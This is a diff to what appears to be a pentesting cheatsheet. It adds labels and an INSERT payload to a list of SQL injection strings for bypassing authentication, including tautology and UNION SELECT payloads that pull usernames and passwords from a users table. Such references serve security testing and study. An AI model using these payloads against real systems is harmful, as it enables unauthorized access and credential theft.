@@ -91,9 +91,15 @@ More SQLi cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-
 
 Authentication Bypass
 ```SQL
+BLIND
 ' or '1'='1
+
+SELECT
 ' UNION ALL SELECT CURRENT_USER, '1
 ' UNION ALL SELECT name,pass FROM users WHERE name="noone"--    # whitespace needed after -- comment
+
+INSERT
+" INSERT INTO users (user, pass, uuid) VALUES ('brian', 'brian', '123')
 ```
 
 **Exploitation: Sqlmap**  
